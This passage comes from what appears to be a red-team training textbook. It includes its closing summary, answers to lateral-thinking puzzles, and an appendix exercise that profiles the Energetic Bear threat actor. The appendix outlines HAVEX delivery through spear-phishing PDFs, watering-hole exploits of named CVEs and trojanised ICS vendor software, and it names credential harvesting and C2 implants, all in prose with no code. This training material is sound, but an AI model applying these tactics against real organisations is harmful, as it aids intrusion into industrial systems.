Summary
Red Teaming is the process of using well-defined Tactics, Techniques, and Procedures (TTPs) to
emulate a real-world threat with the goals of training and measuring the effectiveness of the people,
processes, and technology used to defend an environment.
Emphasis should be placed on the impacts of threat operations vs. the enabling vulnerabilities.
Vulnerabilities will be discovered and leveraged; however, the weaknesses found are a byproduct of
a Red Team engagement, not the focus. Red Team results should be much more than just a list of
identified flaws. They provide a deeper understanding of how an organization would perform against
an actual threat. A Red Team's real value is assisting a target identify administrative, technical, and
procedural controls that directly limit a threat's ability to cause negative impacts. Even when
vulnerable to the latest "zero-day vulnerability." Consequently, Operational Impacts provide real
insight into the ability security operations has to protect, detect, respond, or recover from a variety of
threats.
Did you notice engagement planning was quite a bit longer than execution, culmination, and reporting?
There is a method to that madness. Engagement Planning is crucial to manage potential engagement
risks effectively, successfully execute desired goals and objectives, and providing the information
required to improve both organizational and defensive capabilities. In short, it is nearly impossible to
conduct a professional and successful engagement without fully understanding the goals and scope,
understanding the resources required to execute, and creating a solid plan. Likewise, effective
planning dramatically increases the speed and accuracy of both engagement culmination and
reporting. The importance of engagement planning cannot be stressed enough.
Deliverables (Reports) enable the organization to replicate the actions and results of the Red Team.
They are the last form of evidence that can be analyzed and used to provide a base for improving
security. They must be included as a final delivery for an engagement.
Finally, we would like to stress our common mantra. "If there is no log, there was no action. If there
is no report, there was no engagement". Red Team operators and leads should take this to heart and
encourage each other to document their actions properly.

Conclusion
We want to thank you for taking the time to read this content. Of course, reading is only one step in
your efforts. It is also essential to absorb, process, and understand the lessons and concepts as
presented. If you didn't while reading, we recommend working through the homework assignments.
The best way to learn and improve upon these concepts is to implement and practice them.
It has taken years of research, experimentation (a.k.a trial-and-error), and execution to discern what
elements should and should not be part of this text. Our goal was to provide practical guidance to
assist you, or your team, in the development, management, and execution of a professional Red Team.
Volumes upon volumes could be written on each individual topic; however, we have attempted to
write to the 80/20 rule. Eighty (80) percent of what you see, hear, and experience is the least valuable
information. This text covers what we believe to be the twenty (20) percent of Red Team
Development and Operations that has the most value. It will not only make you a better Red Teamer,
but it should also provide a means to streamline your efforts and alleviate your work-load. In the end,
improving (making things better) and enjoying yourself in the process is what counts the most. Again,
thank you!

Mindset Challenge Comments and Answers
9 Dot Challenge
Possible answers.
Did you come up with something different? The point of this exercise to support the phrase “think
outside the box”. Do not limit yourself by what’s presented and focus on measuring what “Is” vs what
“Should be”
Maze Challenge
Possible Answers
How does your solution compare? The point of this exercise is similar to the prior. Don’t let
assumptions and limitations prevent possible solutions. A good Red Teamer is able to understand and
bend rules in ways that are not always considered.
Triangle Puzzle
Answer: Total Triangles = 27
When faced with a problem for which you don’t know the “formula,” a brute force approach may be
needed. Lessons can be learned, and “formulas” can be added to your knowledge base to improve
efficiency when faced with similar problems in the future.
Formula:
T(n) = floor(n*(n + 2)*(2n + 1) / 8)
Example:
f(4) = 4*(4 + 2)*(2*4 + 1) / 8 = 27.000

Word Puzzle
This is a common lateral thinking puzzle. These types of puzzles often gives the audience a seemingly
unusual set of circumstances where they must try and figure out what happened or what's going on in
an unusual short story. These help show how difficult challenges can often be solved with easy
solutions.
Classic Solution:
The man had the hiccups and wanted a glass of water to help get rid of them. The bartender could
hear the hiccups when the man spoke, so he brought the gun out to scare the hiccups away. It worked,
and the man thanked him and left, no longer needing the glass of water.
How did your answer compare to the classic solution?
Alternative Thought Processing
During World War 2, the U.S. Navy performed a review of aircraft with combat encounters. This
review intended to determine where aircraft needed additional armor to ensure survivability and safe
return. Upon analysis the Navy decided all the locations where bullet holes were found needed to be
better armored as they are more likely to be hit. These included the tips of the wings, the central body,
and the elevators.
A Navy Statistician, Abraham Wald[27] had another theory. The areas with bullet holes identified
where the aircraft was already survivable. He recommended armoring the nose, engine, and mid-body
although few of the aircraft had damage to those areas. Why?
Wald recognized those areas were also being shot; however, weren't able to return safely. He
correctly surmised that aircraft with shots to the wings, central body, and elevators were able to
return while those with shots to the nose, engine, and mid-body were catastrophically damaged and
unable to return.
Consider how this scenario translates to Red Teaming or security in general. Also consider what is
known (and unknown) given information from threat intelligence, current events, and indicators.
Appendix C: Decomposing a Threat Exercise
Description
This exercise walks through the process of decomposing a threat and threat scenario to build a threat
profile. You will examine the Energetic Bear threat actor to develop a threat profile that can be used
during a Red Team engagement.
Objectives
1. Review the Energetic Bear threat actor’s TTPs.
2. Use the information to create a threat that is similar and can be used to support future
Red Team engagements.
3. Complete a threat profile template
Exercise Scenario
A client has asked your Red Team to emulate a specific threat. Specifically, they are interested in the
attacks by Energetic Bear.
Goal
The goal of this exercise is to create a threat profile document using Energetic Bear for inspiration.
As a professional Red Team, you understand that emulating a specific threat actor is not easy or
feasible, and focusing on threat TTPs is more relevant. You will use research on Energetic Bear's
TTPs to build a custom threat profile that is technically feasible and can be used to engage the client
with a realistic threat.

HAVEX Payload Delivery
Energetic Bear used
three major methods to deliver malware.
1) Malicious PDF via spear-phishing Spear-phishing was used to infect targeted individuals
for initial information gathering by delivering malicious PDF documents—in this case,
PDF/SWF exploits targeting CVE-2011-0611 to drop malware.3 Even with this running
through 2014, older exploits were still valuable.
2) Malicious JAR and HTML via a watering hole attackWatering hole attacks were used to
deliver Backdoor.Oldrea by Symantec. These attacks exploited CVE-2013-2465, CVE-
2013-1347, and CVE-2012-1723 in Java 6, Java 7, IE 7, and IE 8 to drop the HAVEX
malware. The exploits appeared to be modified Metasploit Java exploits built to deliver
the HAVEX loader.
3) Legitimate software loaders Energetic Bear compromised several legitimate ICS vendor
websites. Binaries such as camera drivers and PLC management software were modified
and made to deliver the HAVEX malware.
In order to complete the third attack type, the threat actor had to compromise several ICS vendors’
websites. Sometimes called a Strategic Web Compromise (SWC) attack, these have become a
favorite attack method from Russian and Chinese-based threats. In this case, SWC attacks were used
to compromise a site that would most likely be visited by customers or users of ICS systems. This
made the watering hole or binary compromises much more useful against the targeted victim. Using
these three attack types demonstrated an organized and arguably sophisticated threat actor. The team
behind this planned and organized a scenario to be successful against its target audience.
Once malware was delivered, three major tasks were observed:
● System enumeration tools collected information, such as the OS version, machine name and
username, and file and directory listings.
● A credential-harvesting tool extracted stored passwords from various web browsers.
● Secondary implants6 communicated with different C2 infrastructures using custom
protocols and payloads executed in memory.
